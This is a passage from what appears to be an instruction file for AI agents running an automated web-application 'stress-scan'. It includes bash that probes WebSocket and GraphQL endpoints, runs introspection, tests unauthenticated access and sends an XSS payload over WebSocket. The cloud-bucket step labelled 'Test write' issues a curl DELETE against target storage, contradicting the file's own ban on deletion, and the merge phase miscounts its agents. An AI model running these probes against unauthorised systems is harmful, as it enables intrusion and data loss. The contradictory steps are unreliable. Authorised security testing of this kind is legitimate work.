  with error page or NXDOMAIN on the CNAME target
- **HTTP request smuggling**: **smuggler** on `$TARGET_URL`
- **Cloud bucket access** (**always run — curl only**):
  For each entry in `cloud/exposed_buckets.txt`:
  - Document listing: `curl -s "$bucket_url" | head -50` → log object names/sizes
  - Test write: `curl -X DELETE "$bucket_url/test_object"` → log HTTP code only
  - **Never delete or download actual objects**

**Verification loop**:
- Takeover: `dig CNAME` + `curl -sk "https://$subdomain"` →
  **Verified** if CNAME exists AND target returns error/default page
- Bucket: `curl -s "$bucket_url"` → **Verified** if listing returns 200 with object data
- Smuggling: **Verified** if smuggler reports confirmed desync

**Safety**: document only — never claim subdomains or modify cloud storage

---

## Agent 8 — WebSocket & GraphQL Security

**Launch in parallel with other agents:**
```bash
{
# 8a — WebSocket endpoint detection (always run)
grep -iE "(ws://|wss://|websocket|socket\.io|/ws$|/wss$)" \
  "$OUTDIR/crawl/all_urls_final.txt" \
  "$OUTDIR/recon/all_endpoints.txt" 2>/dev/null \
  | sort -u > "$OUTDIR/ws_candidates.txt"

# Check HTTP upgrade headers
while IFS= read -r host; do
  WS_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Upgrade: websocket" \
    -H "Connection: Upgrade" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Sec-WebSocket-Version: 13" \
    --max-time 5 "$host/ws" 2>/dev/null)
  [[ "$WS_STATUS" == "101" ]] && echo "$host/ws" >> "$OUTDIR/ws_candidates.txt"
done < "$OUTDIR/recon/live_urls.txt" 2>/dev/null

# 8b — GraphQL endpoint detection (always run)
for path in /graphql /graphiql /api/graphql /v1/graphql /query /gql /graph; do
  while IFS= read -r host; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$host$path" 2>/dev/null)
    [[ "$STATUS" =~ ^(200|400|405)$ ]] && echo "$host$path" >> "$OUTDIR/graphql_candidates.txt"
  done < "$OUTDIR/recon/live_urls.txt" 2>/dev/null
done

# 8c — GraphQL introspection test (always run)
while IFS= read -r endpoint; do
  INTRO_RESP=$(curl -sk -X POST \
    -H "Content-Type: application/json" \
    -H "$AUTH_HEADER" \
    -d '{"query":"{__schema{types{name}}}"}' \
    --max-time 10 "$endpoint" 2>/dev/null)

  if echo "$INTRO_RESP" | grep -q "__schema"; then
    echo "[FINDING-A8] GraphQL introspection enabled: $endpoint" \
      >> "$OUTDIR/agent8_findings.txt"
    echo "$INTRO_RESP" > "$OUTDIR/gql_introspection.json"
    echo "$INTRO_RESP" | grep -oE '"name":"[^"]+"' \
      | sed 's/"name":"//;s/"//' | grep -v "^__" \
      >> "$OUTDIR/gql_types.txt"
  fi
done < "$OUTDIR/graphql_candidates.txt" 2>/dev/null

# 8d — GraphQL auth check (run if introspection found)
GRAPHQL_ENDPOINT=$(head -1 "$OUTDIR/graphql_candidates.txt" 2>/dev/null)
if [[ -f "$OUTDIR/gql_types.txt" && -n "$GRAPHQL_ENDPOINT" ]]; then
  while IFS= read -r type_name; do
    QUERY='{"query":"{'"$type_name"' {id}}"}'
    AUTH_D=$(curl -sk -X POST -H "Content-Type: application/json" \
      -H "$AUTH_HEADER" -d "$QUERY" --max-time 10 "$GRAPHQL_ENDPOINT" 2>/dev/null)
    UNAUTH_D=$(curl -sk -X POST -H "Content-Type: application/json" \
      -d "$QUERY" --max-time 10 "$GRAPHQL_ENDPOINT" 2>/dev/null)
    AUTH_HAS=$(echo "$AUTH_D" | grep -c '"data"')
    UNAUTH_HAS=$(echo "$UNAUTH_D" | grep -c '"data"')
    if [[ "$AUTH_HAS" -gt 0 && "$UNAUTH_HAS" -gt 0 ]]; then
      echo "[FINDING-A8] GraphQL BFLA: $type_name accessible without auth" \
        >> "$OUTDIR/agent8_findings.txt"
    fi
  done < "$OUTDIR/gql_types.txt"
fi

# 8e — WebSocket injection (if wscat available)
if command -v wscat &>/dev/null; then
  while IFS= read -r ws_endpoint; do
    echo '<script>alert(1)</script>' | timeout 5 wscat -c "$ws_endpoint" \
      > "$OUTDIR/ws_xss_$(echo $ws_endpoint | md5sum | cut -c1-8).txt" 2>/dev/null || true
  done < "$OUTDIR/ws_candidates.txt" 2>/dev/null
else
  echo "[skip] wscat — npm install -g wscat" >> "$OUTDIR/agent8_findings.txt"
fi

AGENT8_COUNT=$(grep -c "FINDING-A8" "$OUTDIR/agent8_findings.txt" 2>/dev/null || echo 0)
echo "[agent-8] Done. Findings: $AGENT8_COUNT"
} &
```

Agent 8 findings are written to `$OUTDIR/agent8_findings.txt` and use prefix `ST-A8-*`.

---

## Phase 3 — Merge & Deduplicate

After all 7 agents complete:

1. Create `$OUTDIR/agents/` directory if not exists
2. Read all `*_findings.json` from agent outputs **and** `$OUTDIR/agent8_findings.txt` (Agent 8 — WebSocket & GraphQL, prefix `ST-A8-`; parse `[FINDING-A8]` lines into JSON entries before merging)
3. Merge into unified findings list
4. Deduplicate by `(affected_url, title)` — keep the entry with `verified: true` if both exist
5. Sort by severity: Critical → High → Medium → Low → Info
6. Assign final IDs with `ST-` prefix: `ST-001`, `ST-002`, etc.
7. Aggregate stats:
   ```
   Total findings:    N
   Verified:          N (X%)
   Unverified:        N
   By severity:       Critical=N  High=N  Medium=N  Low=N  Info=N
   By agent:          INJ=N  XSS=N  SLF=N  AUTH=N  CFG=N  SEC=N  INF=N
   ```

### 3b — Update hunt memory

For each **verified** finding, append a pattern entry to `memory/patterns.jsonl`:
```json
{
  "tech": "<detected tech stack — e.g., rails, express, django, spring>",
  "vuln_class": "<vulnerability class — e.g., sqli, xss, ssrf, idor, cors>",
  "param": "<the parameter that was vulnerable — e.g., id, callback, url>",
  "path_pattern": "<generalized path — e.g., /api/*/users, /admin/*, /search>",
  "severity": "<Critical|High|Medium|Low>",
  "found_count": 1,
  "last_seen": "<YYYY-MM-DD>",
  "target_domain": "<target domain>",
  "agent": "<which agent found it — e.g., INJ, XSS, AUTH>"
}
```

**Rules for writing patterns:**
- Only write patterns for **verified** findings (skip unverified)
- Generalize the path: replace specific IDs with `*` (e.g., `/api/users/123` → `/api/users/*`)
- If a matching pattern already exists in `patterns.jsonl` (same `tech` + `vuln_class` + `param`),
  increment `found_count` and update `last_seen` instead of adding a duplicate
- Extract tech stack from `$OUTDIR/recon/tech_stack.txt` — use lowercase normalized names
  (e.g., `Ruby on Rails` → `rails`, `Express` → `express`, `Django` → `django`)

---

## Phase 4 — Report & Handoff

### 4a — Generate report

Create `reports/report_stress_<YYYYMMDD_HHMMSS>.json` + `.md`. Finding prefix: `ST-`.

**JSON structure**: follows `templates/report_schema.json` with additional fields:
- `verified: true/false` per finding
- `verification_method` per finding
- `original_agent` per finding (which agent found it)
- `rank` per finding (from ranked_urls.txt)

**Markdown sections**: live targets, tech stack, WAF + TLS, cloud intel, endpoint map,
URL surface stats, PII/financial URLs, findings by agent, verification summary,
agent performance stats.

Each finding: `id · title · severity · cvss_score · affected_url · evidence ·
verified · verification_method · poc_file`

### 4b — Handoff

Print:
```
=== stress-scan complete ===
  Findings: N total (X verified, Y unverified)
  Critical: N   High: N   Medium: N   Low: N   Info: N
  Report:   reports/report_stress_<timestamp>.json

  Next step: run escalate-scan --report reports/report_stress_<timestamp>.json
  escalate-scan will re-verify, chain vulnerabilities, score CVSS, and generate final report.
======
```

---

## Safety Rules

- No credential brute-forcing — 3-probe rate-limit checks only
- No sqlmap exploitation — identification mode only; escalate to escalate-scan
- No dalfox live payloads — `--skip-bav` pipe mode only
- No destructive HTTP methods (PUT / DELETE / PATCH) that modify target data
- No cloud object deletion or upload — log HTTP response code only; never extract data
- No user data enumeration — document IDOR surface only
- Never forge JWT tokens — analysis only
- Respect `MAX_REQUESTS` hard cap across the entire session (shared across all agents)
- WAF detected → cap all tool rates at ≤ 10 req/s
- Missing tool → `[skip] <tool> — run: bash install.sh`; use curl fallback for "always run" steps
- **Timeout rule (MANDATORY)**: Every external tool invocation MUST be wrapped with
  `timeout Ns <command>`. If a tool hangs past its timeout, it is killed and the agent
  continues. **Read timeout values from `scope.txt`** — users can adjust these:
  - `TOOL_TIMEOUT_SCANNER` (default 600s/10m) — nuclei, dalfox, corsy, crlfuzz
  - `TOOL_TIMEOUT_EXPLOIT` (default 300s/5m) — sqlmap, tplmap, smuggler, trufflehog
  - `TOOL_TIMEOUT_CURL` (default 10s) — individual curl `--max-time`
  Curl loops over all_urls_final.txt: limit to first 500 URLs via `head -500`.
  **A hung tool must NEVER block the entire pipeline.**
